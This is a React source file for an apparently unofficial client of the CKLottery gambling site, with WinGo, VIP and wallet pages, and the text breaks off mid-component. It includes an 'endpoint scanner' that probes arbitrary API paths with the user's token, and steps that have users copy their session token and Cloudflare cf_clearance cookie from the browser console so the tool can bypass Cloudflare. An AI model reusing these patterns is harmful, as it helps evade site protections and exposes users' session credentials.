import { useState, useEffect, useCallback, useRef } from "react";
import type { UserSession } from "../App";
import { decodeJwt } from "../utils/jwt";
import { CK_API_BASE } from "../utils/ckSign";

interface ProfilePageProps {
  session: UserSession;
  initialUserInfo: Record<string, unknown> | null;
  onLogout: () => void;
  onUpdateSession: (updates: Partial<UserSession>) => void;
}

type Page = "home" | "main" | "vip" | "wallet" | "deposit" | "depositNew" | "withdraw" | "game" | "transaction" | "addBalance" | "tokenInfo" | "editData" | "wingo";

function buildAuth(s: UserSession) {
  return `${(s.tokenHeader || "Bearer").trim()} ${s.token}`.trim();
}

function parseApiJson(text: string, httpStatus: number): Record<string, unknown> {
  let json: Record<string, unknown>;
  try {
    json = JSON.parse(text) as Record<string, unknown>;
  } catch {
    throw new Error(`Non-JSON response (HTTP ${httpStatus}) — server may be blocked`);
  }
  if (json.error === "cloudflare_blocked") {
    throw new Error("cloudflare_blocked");
  }
  if (typeof json.error === "string" && json.code === undefined) {
    throw new Error(json.error as string);
  }
  if (json.code !== 0 && json.code !== 200 && json.code !== undefined) {
    throw new Error(String(json.msg || json.message || `API error code ${json.code}`));
  }
  return json;
}

// Try calling CKLottery API directly from the browser (works on mobile — no Cloudflare block)
// Uses the proxy's /sign endpoint to get a correctly signed body (avoids client-side MD5 bugs)
// Probe any arbitrary base URL + endpoint — used by the endpoint scanner
async function probeEndpoint(baseUrl: string, ep: string, session: UserSession): Promise<{ exists: boolean; msg: string }> {
  try {
    const signRes = await fetch("/api/proxy/sign", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ amount: 1 }),
    });
    if (!signRes.ok) return { exists: false, msg: "sign-svc-down" };
    const signed = await signRes.json() as Record<string, unknown>;
    const tokenHeader = (session.tokenHeader || "Bearer").trim();
    const res = await fetch(`${baseUrl.replace(/\/$/, "")}/${ep}`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        Authorization: `${tokenHeader} ${session.token}`.trim(),
        "token-header": tokenHeader,
      },
      body: JSON.stringify(signed),
    });
    const text = await res.text();
    let json: Record<string, unknown> = {};
    try { json = JSON.parse(text) as Record<string, unknown>; } catch { return { exists: false, msg: "non-json" }; }
    const msg = String(json.msg ?? json.message ?? json.error ?? JSON.stringify(json)).slice(0, 120);
    const m = msg.toLowerCase();
    const notExist = m.includes("url is not exist") || m.includes("url not exist") || m.includes("not exist") || m.includes("not found") || m.includes("no route") || m.includes("no such") || m.includes("invalid url");
    return { exists: !notExist, msg };
  } catch (e) {
    return { exists: false, msg: String(e).slice(0, 80) };
  }
}

async function apiPostDirect(path: string, body: Record<string, unknown>, session: UserSession): Promise<Record<string, unknown>> {
  // Step 1: get a server-signed body
  const signRes = await fetch("/api/proxy/sign", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!signRes.ok) throw new Error("Signing service unavailable");
  const signed = await signRes.json() as Record<string, unknown>;

  // Step 2: call CKLottery directly from the browser
  const tokenHeader = (session.tokenHeader || "Bearer").trim();
  const res = await fetch(`${CK_API_BASE}/${path}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
      Authorization: `${tokenHeader} ${session.token}`.trim(),
      "token-header": tokenHeader,
    },
    body: JSON.stringify(signed),
  });
  return parseApiJson(await res.text(), res.status);
}

// Try proxy (server-side) — may be blocked by Cloudflare on some IPs
async function apiPostProxy(path: string, body: Record<string, unknown>, session: UserSession): Promise<Record<string, unknown>> {
  const auth = buildAuth(session);
  const res = await fetch(`/api/proxy/ck/${path}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
      Authorization: auth,
      "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
      ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
    },
    body: JSON.stringify(body ?? {}),
  });
  return parseApiJson(await res.text(), res.status);
}

async function apiPost(path: string, body: unknown, session: UserSession): Promise<Record<string, unknown>> {
  const b = (body ?? {}) as Record<string, unknown>;
  // Try direct browser call first — mobile browsers are not blocked by Cloudflare
  try {
    return await apiPostDirect(path, b, session);
  } catch (directErr) {
    const msg = String(directErr);
    // CORS / network errors → fall back to proxy silently
    // Auth/API errors → re-throw immediately (proxy won't help)
    const isCorsOrNetwork = msg.includes("Failed to fetch") || msg.includes("NetworkError") || msg.includes("Load failed") || msg.includes("CORS") || msg.includes("fetch");
    if (!isCorsOrNetwork) throw directErr;
  }
  // Fallback: proxy
  return await apiPostProxy(path, b, session);
}

function extractList(d: Record<string, unknown>): Record<string, unknown>[] {
  // Try the top-level response or nested data
  const candidates = [d, d?.data, (d?.data as Record<string, unknown>)];
  for (const obj of candidates) {
    if (Array.isArray(obj)) return obj as Record<string, unknown>[];
    if (obj && typeof obj === "object") {
      const o = obj as Record<string, unknown>;
      // Cast wide net over all known CKLottery key names for payment type lists.
      // NOTE: "rechargetypelist" is all-lowercase per actual API response.
      for (const key of [
        "rechargetypelist", "rechargeTypelist", "rechargeTypeList",
        "typelist", "typeList", "payTypelist", "payTypeList",
        "rechargeTypes", "payTypes", "payTypeData",
        "list", "records", "items", "data", "result", "content",
      ]) {
        if (Array.isArray(o[key]) && (o[key] as unknown[]).length > 0) return o[key] as Record<string, unknown>[];
      }
    }
  }
  return [];
}

/** Collect all payment method arrays (e-wallet, bank, USDT, third-party) from a GetRechargeTypes response. */
function extractAllMethods(d: Record<string, unknown>): Record<string, unknown>[] {
  const data = (d?.data ?? d) as Record<string, unknown>;
  const out: Record<string, unknown>[] = [];
  const listKeys = ["rechargetypelist", "rechargeTypelist", "typelist", "typeList",
    "banklist", "bankList", "localUsdtlist", "localUsdtList", "thirdPayBankList", "thirdPayBanklist"];
  for (const key of listKeys) {
    const arr = data?.[key];
    if (Array.isArray(arr) && arr.length > 0) {
      for (const item of arr as Record<string, unknown>[]) {
        out.push({ ...item, _sourceKey: key });
      }
    }
  }
  return out;
}

// ─── Token expiry banner ───────────────────────────────────────────────────────
function ExpiredBanner({ onLogout }: { onLogout: () => void }) {
  return (
    <div className="mx-4 mt-3 bg-red-50 border border-red-200 rounded-2xl p-4">
      <div className="flex items-start gap-3">
        <span className="text-2xl">⚠️</span>
        <div className="flex-1">
          <div className="text-red-600 font-semibold text-sm">Token Expired</div>
          <div className="text-red-400 text-xs mt-1">
            Your session token has expired. Data cannot be loaded. Please log out and paste a fresh token.
          </div>
          <div className="text-red-400 text-xs mt-1">
            Get new token: open cklottery.club → console →{" "}
            <code className="bg-red-100 px-1 rounded text-[10px]">localStorage.getItem('token')</code>
          </div>
        </div>
      </div>
      <button
        onClick={onLogout}
        className="mt-3 w-full bg-red-500 text-white text-sm font-bold py-2 rounded-xl"
      >
        Logout & Refresh Token
      </button>
    </div>
  );
}

// ─── Shared sub-page shell ─────────────────────────────────────────────────────
function SubPage({ title, onBack, children }: { title: string; onBack: () => void; children: React.ReactNode }) {
  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <div className="bg-gradient-to-r from-blue-500 to-blue-600 px-4 pt-12 pb-5 flex items-center gap-3">
        <button onClick={onBack} className="text-white text-3xl leading-none w-8 flex-shrink-0">‹</button>
        <h1 className="text-white font-bold text-lg">{title}</h1>
      </div>
      <div className="flex-1 px-4 py-4 overflow-y-auto">{children}</div>
    </div>
  );
}

// ─── Status badge ──────────────────────────────────────────────────────────────
function StatusBadge({ status, str }: { status: unknown; str: unknown }) {
  const raw = String(str || status || "").toLowerCase().trim();
  const ok = raw === "success" || raw === "completed" || raw === "paid" || status === 1 || raw === "1";
  const pending = raw === "pending" || raw === "processing" || status === 0 || raw === "0";
  const fail = raw === "fail" || raw === "failed" || raw === "rejected" || status === 2 || raw === "2";
  const cls = ok ? "bg-green-100 text-green-600" : pending ? "bg-yellow-100 text-yellow-600" : fail ? "bg-red-100 text-red-500" : "bg-gray-100 text-gray-500";
  const label = str || (ok ? "Success" : pending ? "Pending" : fail ? "Failed" : status ?? "—");
  return <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${cls}`}>{String(label)}</span>;
}

// ─── Cloudflare helpers ───────────────────────────────────────────────────────
function isCfError(err: string) {
  return err === "cloudflare_blocked" || err.toLowerCase().includes("cloudflare") || err.toLowerCase().includes("proxy blocked") || err.toLowerCase().includes("cf_clearance") || err.toLowerCase().includes("server may be blocked");
}

function CloudflareFixPanel({ onFix }: { onFix: (val: string) => void }) {
  const [val, setVal] = useState("");
  const [copied, setCopied] = useState(false);
  const consoleCmd = `document.cookie.match(/cf_clearance=([^;]+)/)?.[1]`;

  function copyCmd() {
    navigator.clipboard.writeText(consoleCmd).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); }).catch(() => {});
  }

  return (
    <div className="w-full mt-3 bg-amber-50 border border-amber-200 rounded-2xl p-4 text-left">
      <div className="flex items-start gap-2 mb-3">
        <span className="text-xl shrink-0">🛡️</span>
        <div>
          <div className="text-amber-800 font-semibold text-sm">Server blocked — paste cf_clearance to fix</div>
          <div className="text-amber-700 text-xs mt-0.5 leading-relaxed">
            The proxy server is blocked by Cloudflare. Paste your browser's Cloudflare cookie to bypass it.
          </div>
        </div>
      </div>
      <div className="bg-amber-100/60 rounded-xl p-3 mb-3 text-xs text-amber-900 leading-relaxed space-y-1">
        <div className="font-bold mb-1">Step-by-step:</div>
        <div>1. Open <strong>https://ckygjf6r.com</strong> in your browser (you'll see a security check)</div>
        <div>2. After the check passes, open browser console / DevTools</div>
        <div>3. Paste and run this command:</div>
        <div className="flex items-center gap-2 mt-1">
          <code className="bg-white border border-amber-200 rounded px-2 py-1 text-[11px] flex-1 break-all">{consoleCmd}</code>
          <button type="button" onClick={copyCmd} className="shrink-0 bg-amber-200 text-amber-800 text-xs px-2 py-1 rounded-lg font-medium active:opacity-70">
            {copied ? "✓" : "Copy"}
          </button>
        </div>
        <div className="mt-1">4. Copy the result (a long string) and paste below</div>
      </div>
      <input
        type="text"
        placeholder="Paste cf_clearance value here…"
        value={val}
        onChange={(e) => setVal(e.target.value)}
        className="w-full border border-amber-300 rounded-xl px-3 py-2.5 text-xs text-gray-800 bg-white focus:outline-none focus:border-amber-500 mb-2 font-mono"
      />
      <button
        type="button"
        disabled={!val.trim()}
        onClick={() => onFix(val.trim())}
        className="w-full bg-amber-500 text-white font-bold py-2.5 rounded-xl text-sm disabled:opacity-40 active:opacity-80"
      >
        Apply &amp; Retry
      </button>
    </div>
  );
}

// ─── Empty/Error state ────────────────────────────────────────────────────────
function ListState({ loading, error, empty, onCfFix, onRetry }: { loading: boolean; error: string; empty: boolean; onCfFix?: (val: string) => void; onRetry?: () => void }) {
  if (loading) return (
    <div className="flex flex-col items-center py-16 text-gray-400">
      <div className="text-4xl mb-3 animate-spin">⟳</div>
      <p className="text-sm">Loading...</p>
    </div>
  );
  if (error) {
    const isCf = isCfError(error);
    const isToken = error.toLowerCase().includes("expir") || error.toLowerCase().includes("token") || error.toLowerCase().includes("login");
    return (
      <div className="flex flex-col items-center py-8 text-center px-4 w-full">
        <div className="text-4xl mb-3">{isCf ? "🛡️" : isToken ? "⚠️" : "🔒"}</div>
        <p className="text-sm font-semibold text-orange-500 mb-1">
          {isCf ? "Cloudflare Blocked" : isToken ? "Token Expired" : "API Error"}
        </p>
        <p className="text-xs text-gray-400 mb-3">{error}</p>
        {onRetry && !isCf && (
          <button type="button" onClick={onRetry} className="text-xs bg-blue-50 text-blue-500 px-4 py-2 rounded-xl font-medium active:opacity-70">
            ↻ Retry
          </button>
        )}
        {isCf && onCfFix && <CloudflareFixPanel onFix={onCfFix} />}
      </div>
    );
  }
  if (empty) return (
    <div className="flex flex-col items-center py-16 text-gray-400">
      <div className="text-4xl mb-3">📭</div>
      <p className="text-sm">No records found</p>
    </div>
  );
  return null;
}

// ─── Game Home Page ────────────────────────────────────────────────────────────
const GAME_CATS = [
  { icon: "🏆", label: "Popular", color: "from-yellow-400 to-orange-400" },
  { icon: "🎱", label: "Lottery", color: "from-purple-500 to-blue-500" },
  { icon: "🎰", label: "Slots", color: "from-red-500 to-orange-400" },
  { icon: "⚽", label: "Sports", color: "from-green-400 to-teal-400" },
  { icon: "🃏", label: "Casino", color: "from-pink-500 to-rose-400" },
  { icon: "🀄", label: "Rummy", color: "from-orange-400 to-yellow-400" },
  { icon: "🦈", label: "Fishing", color: "from-blue-400 to-cyan-400" },
  { icon: "🎮", label: "Original", color: "from-violet-500 to-purple-400" },
];

const SLOT_PROVIDERS = [
  { label: "PP GAME", icon: "🎰" },
  { label: "CQ9 GAME", icon: "🎲" },
  { label: "JDB GAME", icon: "🃏" },
  { label: "MG GAME", icon: "🎡" },
  { label: "PG GAME", icon: "🎯" },
  { label: "JILI GAME", icon: "🎳" },
];

function wingoNumberProps(nStr: string) {
  const n = Number(nStr);
  const isBig = n >= 5;
  const isGreen = n === 1 || n === 3 || n === 7 || n === 9;
  const isRed = n === 2 || n === 4 || n === 6 || n === 8;
  const isViolet = n === 0 || n === 5;
  return { isBig, isGreen, isRed, isViolet };
}

function WinGoBall({ n }: { n: string }) {
  const { isGreen, isRed, isViolet } = wingoNumberProps(n);
  const bg = isViolet
    ? "bg-gradient-to-br from-red-500 to-violet-600"
    : isGreen
    ? "bg-green-500"
    : isRed
    ? "bg-red-500"
    : "bg-gray-400";
  return (
    <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold text-white shrink-0 ${bg}`}>
      {n}
    </div>
  );
}

function GameHomePage({
  onNav,
  onLogout,
  wingoResults,
  wingoLoading,
}: {
  onNav: (p: Page) => void;
  onLogout: () => void;
  wingoResults: Record<string, unknown>[];
  wingoLoading: boolean;
}) {
  const [activeCat, setActiveCat] = useState("Popular");

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col pb-20">
      {/* Header */}
      <div className="bg-gradient-to-r from-blue-600 to-blue-500 px-4 pt-10 pb-4 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-white text-2xl">🏆</span>
          <span className="text-white font-bold text-lg tracking-wide">CKLOTTERY</span>
        </div>
        <div className="flex items-center gap-3">
          <span className="text-white text-xl">✉️</span>
          <span className="text-white text-xl">⬇️</span>
        </div>
      </div>

      {/* Banner */}
      <div className="mx-4 mt-3 bg-gradient-to-r from-purple-600 via-blue-600 to-pink-500 rounded-2xl p-5 flex items-center justify-between shadow-lg">
        <div>
          <div className="text-yellow-300 text-xs font-bold mb-1">CKLOTTERY</div>
          <div className="text-white font-bold text-2xl leading-tight">1,500,000,000</div>
          <div className="text-white/80 text-xs mt-1">Join and win big prizes!</div>
        </div>
        <div className="text-6xl">🎰</div>
      </div>

      {/* Categories */}
      <div className="mx-4 mt-3 grid grid-cols-4 gap-2">
        {GAME_CATS.map((cat) => (
          <button
            key={cat.label}
            type="button"
            onClick={() => setActiveCat(cat.label)}
            className={`flex flex-col items-center gap-1.5 p-2 rounded-2xl transition-all ${
              activeCat === cat.label ? "ring-2 ring-blue-400 bg-blue-50" : "bg-white"
            } shadow-sm`}
          >
            <div className={`w-10 h-10 rounded-xl bg-gradient-to-br ${cat.color} flex items-center justify-center text-xl shadow`}>
              {cat.icon}
            </div>
            <span className="text-xs text-gray-600 font-medium">{cat.label}</span>
          </button>
        ))}
      </div>

      {/* WinGo Lottery Results */}
      {(activeCat === "Lottery" || activeCat === "Popular") && (
        <div className="mx-4 mt-3">
          <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
            <button
              type="button"
              onClick={() => onNav("wingo")}
              className="w-full bg-gradient-to-r from-purple-500 to-blue-500 px-4 py-3 flex items-center justify-between active:opacity-90"
            >
              <div className="flex items-center gap-2">
                <span className="text-white text-xl">🎱</span>
                <span className="text-white font-bold">WinGo Lottery</span>
              </div>
              <span className="text-white/80 text-xs flex items-center gap-1">Play &amp; View All <span className="text-sm">›</span></span>
            </button>
            {wingoLoading ? (
              <div className="py-6 text-center text-gray-400 text-sm">Loading results...</div>
            ) : wingoResults.length === 0 ? (
              <div className="py-6 text-center text-gray-400 text-sm">🔒 API data unavailable (token expired)</div>
            ) : (
              <div className="divide-y divide-gray-50">
                {wingoResults.slice(0, 8).map((r, i) => (
                  <div key={i} className="px-4 py-3 flex items-center gap-3">
                    <div className="text-xs text-gray-400 w-20 shrink-0">{String(r.period ?? r.issueNumber ?? `#${i + 1}`)}</div>
                    <div className="flex-1 flex items-center gap-1">
                      {String(r.number ?? r.result ?? "").split("").map((n, j) => (
                        <div key={j} className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold text-white ${Number(n) <= 4 ? "bg-green-400" : "bg-red-400"}`}>{n}</div>
                      ))}
                    </div>
                    <div className={`text-xs font-semibold px-2 py-0.5 rounded-full ${r.color === "Green" || r.color === "green" ? "bg-green-100 text-green-600" : r.color === "Red" || r.color === "red" ? "bg-red-100 text-red-600" : "bg-purple-100 text-purple-600"}`}>
                      {String(r.color ?? r.winColor ?? "—")}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Slots */}
      {(activeCat === "Slots" || activeCat === "Popular") && (
        <div className="mx-4 mt-3">
          <div className="flex items-center gap-2 mb-2">
            <div className="w-1 h-5 bg-blue-500 rounded-full" />
            <span className="text-gray-800 font-bold">Slots</span>
          </div>
          <div className="grid grid-cols-3 gap-2">
            {SLOT_PROVIDERS.map((p) => (
              <div key={p.label} className="bg-white rounded-2xl shadow-sm p-3 flex flex-col items-center gap-2">
                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-400 to-purple-500 flex items-center justify-center text-2xl">
                  {p.icon}
                </div>
                <span className="text-xs text-gray-600 font-medium text-center">{p.label}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Sports */}
      {activeCat === "Sports" && (
        <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-6 text-center text-gray-400">
          <div className="text-4xl mb-2">⚽</div>
          <div className="text-sm">Sports betting coming soon</div>
        </div>
      )}

      {/* Casino */}
      {activeCat === "Casino" && (
        <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-6 text-center text-gray-400">
          <div className="text-4xl mb-2">🃏</div>
          <div className="text-sm">Live casino games</div>
        </div>
      )}

      {/* Bottom nav */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-100 flex justify-around items-end py-2 z-20">
        <button type="button" onClick={() => {}} className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">🏠</span>
          <span className="text-[10px] text-blue-500 font-bold">Home</span>
        </button>
        <button type="button" className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">🎁</span>
          <span className="text-[10px] text-gray-500">Activity</span>
        </button>
        <div className="flex flex-col items-center gap-0.5">
          <div className="w-14 h-14 -mt-5 rounded-full bg-gradient-to-t from-orange-500 to-orange-300 flex items-center justify-center text-2xl shadow-lg">🎰</div>
          <span className="text-[10px] text-orange-500 font-bold">Get K20,000</span>
        </div>
        <button type="button" className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">💰</span>
          <span className="text-[10px] text-gray-500">Promotion</span>
        </button>
        <button type="button" onClick={() => onNav("main")} className="flex flex-col items-center gap-0.5">
          <span className="text-2xl">👤</span>
          <span className="text-[10px] text-gray-500">Account</span>
        </button>
      </div>
    </div>
  );
}

// ─── WinGo Game Page (full data: countdown, latest result, bet panel, full history) ───
const WINGO_DURATION_S = 60;
const WINGO_TABS = [
  { key: "wingo1", label: "WinGo 1Min", secs: 60 },
  { key: "wingo3", label: "WinGo 3Min", secs: 180 },
  { key: "wingo5", label: "WinGo 5Min", secs: 300 },
  { key: "wingo10", label: "WinGo 10Min", secs: 600 },
];

function WinGoPage({
  results,
  loading,
  loadingMore,
  error,
  hasMore,
  onLoadMore,
  onRetry,
  onCfFix,
  onBack,
}: {
  results: Record<string, unknown>[];
  loading: boolean;
  loadingMore: boolean;
  error: string;
  hasMore: boolean;
  onLoadMore: () => void;
  onRetry: () => void;
  onCfFix: (val: string) => void;
  onBack: () => void;
}) {
  const [activeTab, setActiveTab] = useState("wingo1");
  const [selected, setSelected] = useState<{ key: string; label: string } | null>(null);
  const durationS = WINGO_TABS.find((t) => t.key === activeTab)?.secs ?? WINGO_DURATION_S;
  const [secondsLeft, setSecondsLeft] = useState(() => durationS - (Math.floor(Date.now() / 1000) % durationS));

  useEffect(() => {
    setSecondsLeft(durationS - (Math.floor(Date.now() / 1000) % durationS));
    const t = setInterval(() => {
      setSecondsLeft(durationS - (Math.floor(Date.now() / 1000) % durationS));
    }, 1000);
    return () => clearInterval(t);
  }, [durationS]);

  const latest = results[0];
  const latestNum = latest ? String(latest.number ?? latest.result ?? "") : "";
  const latestPeriod = latest ? String(latest.period ?? latest.issueNumber ?? "—") : "—";
  const mm = String(Math.floor(secondsLeft / 60)).padStart(2, "0");
  const ss = String(secondsLeft % 60).padStart(2, "0");

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col pb-6">
      {/* Header */}
      <div className="bg-gradient-to-r from-purple-600 to-blue-600 px-4 pt-12 pb-4 flex items-center gap-3">
        <button onClick={onBack} className="text-white text-3xl leading-none w-8 flex-shrink-0">‹</button>
        <h1 className="text-white font-bold text-lg flex items-center gap-2">🎱 WinGo Lottery</h1>
      </div>

      {/* Duration tabs */}
      <div className="mx-4 mt-3 grid grid-cols-4 gap-2">
        {WINGO_TABS.map((t) => (
          <button
            key={t.key}
            type="button"
            onClick={() => setActiveTab(t.key)}
            className={`text-xs font-semibold py-2 rounded-xl transition-all ${
              activeTab === t.key ? "bg-purple-600 text-white shadow" : "bg-white text-gray-500"
            }`}
          >
            {t.label}
          </button>
        ))}
      </div>

      {/* Countdown + latest result */}
      <div className="mx-4 mt-3 bg-gradient-to-br from-purple-600 via-blue-600 to-purple-500 rounded-2xl p-5 shadow-lg text-white">
        <div className="flex items-center justify-between mb-3">
          <div>
            <div className="text-white/70 text-xs">Current Period</div>
            <div className="font-bold text-base tracking-wide">{latestPeriod}</div>
          </div>
          <div className="text-right">
            <div className="text-white/70 text-xs">Time Left</div>
            <div className="font-mono font-bold text-2xl">{mm}:{ss}</div>
          </div>
        </div>
        {latestNum && (
          <div className="flex items-center gap-2 justify-center bg-white/10 rounded-xl py-3">
            {latestNum.split("").map((n, i) => <WinGoBall key={i} n={n} />)}
          </div>
        )}
      </div>

      {/* Bet selectors (color / size) */}
      <div className="mx-4 mt-3 bg-white rounded-2xl shadow-sm p-4">
        <div className="text-gray-700 font-bold text-sm mb-3">Select Prediction</div>
        <div className="grid grid-cols-3 gap-2 mb-3">
          {[
            { key: "green", label: "Green", cls: "bg-green-500" },
            { key: "violet", label: "Violet", cls: "bg-gradient-to-br from-red-500 to-violet-600" },
            { key: "red", label: "Red", cls: "bg-red-500" },
          ].map((c) => (
            <button
              key={c.key}
              type="button"
              onClick={() => setSelected({ key: c.key, label: c.label })}
              className={`${c.cls} text-white text-sm font-bold py-2.5 rounded-xl transition-all ${selected?.key === c.key ? "ring-2 ring-offset-2 ring-blue-400" : ""}`}
            >
              {c.label}
            </button>
          ))}
        </div>
        <div className="grid grid-cols-2 gap-2 mb-3">
          {[
            { key: "big", label: "BIG" },
            { key: "small", label: "SMALL" },
          ].map((s) => (
            <button
              key={s.key}
              type="button"
              onClick={() => setSelected({ key: s.key, label: s.label })}
              className={`text-sm font-bold py-2.5 rounded-xl border-2 transition-all ${
                selected?.key === s.key ? "border-blue-500 bg-blue-50 text-blue-600" : "border-gray-200 text-gray-600"
              }`}
            >
              {s.label}
            </button>
          ))}
        </div>
        <div className="grid grid-cols-5 gap-2">
          {Array.from({ length: 10 }, (_, n) => String(n)).map((n) => (
            <button key={n} type="button" onClick={() => setSelected({ key: `num${n}`, label: n })}>
              <div className={selected?.key === `num${n}` ? "ring-2 ring-offset-2 ring-blue-400 rounded-full" : ""}>
                <WinGoBall n={n} />
              </div>
            </button>
          ))}
        </div>
        {selected && (
          <div className="mt-3 text-center text-xs text-gray-500">
            Selected: <span className="font-semibold text-gray-800">{selected.label}</span> — display only, this tester does not place bets.
          </div>
        )}
      </div>

      {/* Full result history */}
      <div className="mx-4 mt-3">
        <div className="flex items-center gap-2 mb-2">
          <div className="w-1 h-5 bg-purple-500 rounded-full" />
          <span className="text-gray-800 font-bold">Game History (All Data)</span>
        </div>
        <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
          {(loading || error || results.length === 0) ? (
            <ListState loading={loading} error={error} empty={results.length === 0} onCfFix={onCfFix} onRetry={onRetry} />
          ) : (
            <>
              <div className="grid grid-cols-4 gap-1 px-4 py-2 bg-gray-50 text-[11px] font-semibold text-gray-400 uppercase">
                <span>Period</span>
                <span className="col-span-2">Number</span>
                <span className="text-right">Size</span>
              </div>
              <div className="divide-y divide-gray-50">
                {results.map((r, i) => {
                  const numStr = String(r.number ?? r.result ?? "");
                  const primary = numStr.slice(-1) || numStr;
                  const { isBig } = wingoNumberProps(primary);
                  return (
                    <div key={i} className="px-4 py-2.5 grid grid-cols-4 gap-1 items-center">
                      <div className="text-xs text-gray-500 truncate">{String(r.period ?? r.issueNumber ?? `#${i + 1}`)}</div>
                      <div className="col-span-2 flex items-center gap-1">
                        {numStr.split("").map((n, j) => <WinGoBall key={j} n={n} />)}
                      </div>
                      <div className={`text-xs font-semibold text-right ${isBig ? "text-orange-500" : "text-blue-500"}`}>
                        {isBig ? "Big" : "Small"}
                      </div>
                    </div>
                  );
                })}
              </div>
              {hasMore && (
                <button
                  type="button"
                  onClick={onLoadMore}
                  disabled={loadingMore}
                  className="w-full py-3 text-sm font-medium text-blue-500 active:opacity-70 disabled:opacity-40"
                >
                  {loadingMore ? "Loading..." : "Load More"}
                </button>
              )}
            </>
          )}
        </div>
      </div>
    </div>
  );
}

// ─── VIP Page ──────────────────────────────────────────────────────────────────
function VIPPage({ vipData, claims, userInfo, onBack }: { vipData: Record<string, unknown> | null; claims: Record<string, unknown> | null; userInfo: Record<string, unknown> | null; onBack: () => void }) {
  const nickName = String(claims?.NickName || userInfo?.nickName || "Account");
  const vipLevel = Number(userInfo?.vipLevel ?? vipData?.vipLevel ?? vipData?.level ?? 4);
  const exp = vipData?.exp ?? vipData?.experience ?? vipData?.totalExp ?? vipData?.totalRecharge;
  const payoutDays = String(vipData?.payoutDays ?? 0);
  const benefits = [
    { icon: "🎁", label: "Level up rewards", desc: "Each account can only receive 1 time", reward: String(vipData?.levelUpReward ?? "5,599"), claimed: "0" },
    { icon: "⭐", label: "Monthly reward", desc: "Each account can only receive 1 time per month", reward: String(vipData?.monthlyReward ?? "999"), claimed: "0" },
    { icon: "💰", label: "Deposit Reward", desc: "Get rewards every deposit", reward: String(vipData?.depositRewardRate ? `${vipData.depositRewardRate}%` : "1%") },
    { icon: "🔐", label: "Safe", desc: "Increase the extra income of the safe", reward: "0.015%" },
  ];
  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <div className="bg-gradient-to-r from-blue-500 to-blue-600 px-4 pt-12 pb-12 relative">
        <button onClick={onBack} className="absolute top-12 left-4 text-white text-3xl w-8 flex items-center">‹</button>
        <h1 className="text-white font-bold text-xl text-center mb-8">VIP</h1>
        <div className="flex flex-col items-center">
          <div className="relative">
            <div className="w-20 h-20 rounded-full bg-gray-800 flex items-center justify-center text-4xl shadow-lg">🧑‍🦯</div>
            <div className="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-gradient-to-r from-yellow-400 to-orange-400 text-white text-[10px] font-bold px-2 py-0.5 rounded-full shadow whitespace-nowrap">⭐ VIP{vipLevel}</div>
          </div>
          <div className="text-white font-bold text-lg mt-5">{nickName}</div>
        </div>
      </div>
      <div className="mx-4 -mt-3 bg-white rounded-2xl shadow overflow-hidden">
        <div className="grid grid-cols-2 divide-x divide-gray-100">
          <div className="px-4 py-4 border-b-2 border-blue-500 text-center">
            <div className="text-blue-500 font-bold text-xl">{exp !== undefined && exp !== null ? String(exp) : "—"} EXP</div>
            <div className="text-gray-400 text-xs mt-0.5">My experience</div>
          </div>
          <div className="px-4 py-4 text-center">
            <div className="text-gray-700 font-bold text-xl">{payoutDays} Days</div>
            <div className="text-gray-400 text-xs mt-0.5">Payout time</div>
          </div>
        </div>
      </div>
      <p className="text-xs text-gray-400 text-center mt-3 px-6">VIP level rewards are settled at 2:00 am on the 1st of every month</p>
      <div className="mx-4 mt-3">
        <div className="bg-gradient-to-r from-orange-400 to-rose-400 rounded-2xl p-5 relative overflow-hidden shadow">
          <div className="flex items-center gap-2 mb-1">
            <span className="bg-white/30 text-white text-xs px-2 py-0.5 rounded-full font-semibold">🏅 VIP{vipLevel}</span>
            <span className="text-green-200 text-xs font-semibold">✅ Achieved</span>
          </div>
          <div className="text-orange-100 text-xs mb-2">Dear VIP{vipLevel} customer</div>
          <div className="text-white font-bold text-base">Received VIP level up bonus{vipLevel}</div>
          <div className="absolute -right-4 -top-4 text-8xl opacity-20">⭐</div>
        </div>
      </div>
      <div className="mx-4 mt-4 mb-8">
        <div className="flex items-center gap-2 mb-3">
          <span className="text-blue-400 text-xl">💎</span>
          <span className="text-gray-800 font-bold">VIP{vipLevel} Benefits level</span>
        </div>
        <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
          {benefits.map((b, i) => (
            <div key={i} className="flex items-center gap-3 px-4 py-4 border-b border-gray-50 last:border-0">
              <div className="w-11 h-11 rounded-xl bg-blue-50 flex items-center justify-center text-xl shrink-0">{b.icon}</div>
              <div className="flex-1 min-w-0">
                <div className="text-sm font-semibold text-gray-800">{b.label}</div>
                <div className="text-xs text-gray-400 leading-tight">{b.desc}</div>
              </div>
              <div className="flex flex-col items-end gap-1 shrink-0">
                <div className="bg-orange-50 border border-orange-100 text-orange-500 text-xs font-bold px-2 py-0.5 rounded-full">🪙 {b.reward}</div>
